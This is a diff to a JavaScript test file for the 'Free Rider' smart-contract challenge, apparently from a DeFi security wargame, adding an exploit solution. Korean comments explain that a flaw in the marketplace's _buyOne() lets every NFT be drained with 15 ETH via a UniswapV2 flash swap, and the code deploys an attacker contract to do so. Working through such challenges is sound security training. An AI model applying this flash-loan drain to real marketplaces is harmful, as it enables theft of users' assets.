@@ -105,6 +105,24 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        
+        // FreeRiderNFTMarketplace._buyOne()의 취약점으로 인해 15 ETH(NFT 1개당 가격)만 있으면 모든 NFT를 빼내올 수 있다.
+
+        // UniswapV2의 FlashLoan 이용! - UniswapV2Pair.sol -> swap()
+        // attacker-contracts/FlashLoanFreeRider.sol
+
+        this.exploitContract = await(await ethers.getContractFactory('FlashLoanFreeRider', attacker)).deploy(
+                                                                                                this.uniswapPair.address,
+                                                                                                this.weth.address,
+                                                                                                this.marketplace.address,
+                                                                                                this.nft.address,
+                                                                                                this.buyerContract.address,
+                                                                                              );
+        
+        await this.exploitContract.exploit(ethers.utils.parseEther("15"));
+        
+
+
     });
 
     after(async function () {
